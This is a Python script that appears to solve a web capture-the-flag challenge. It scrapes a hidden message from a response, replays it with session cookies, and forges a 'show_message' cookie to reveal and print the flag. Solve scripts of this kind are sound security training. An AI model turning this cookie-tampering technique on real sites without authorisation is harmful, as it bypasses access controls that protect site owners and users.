import requests

url = "https://challenges.icsjwgctf.com:8000/web"

payload={"message": '"hiding in the comments"'}

response = requests.request("POST", url, data=payload)

url = "https://challenges.icsjwgctf.com:8000/nothing_to_see_here"

response = requests.get(url)
text = response.text
idx = text.index('Message: ') + len("Message: ")

message = text[idx:text.index('"', idx+1)+1]
payload={"message": message}

response = requests.request("POST", url, data=payload, cookies=response.cookies)

payload={"message": '"this is easy"'}

response.cookies["show_message"] = "true"

response = requests.request("POST", url, data=payload, cookies=response.cookies)
text = response.text
idx = text.index('Message: ') + len("Message: ")

message = text[idx:text.index('"', idx+1)+1]
payload={"message": message}

response = requests.request("POST", url, data=payload, cookies = response.cookies)

text = response.text
idx = text.index("flag{")
flag = text[idx:text.index("}", idx) + 1]

print("Flag: " + flag)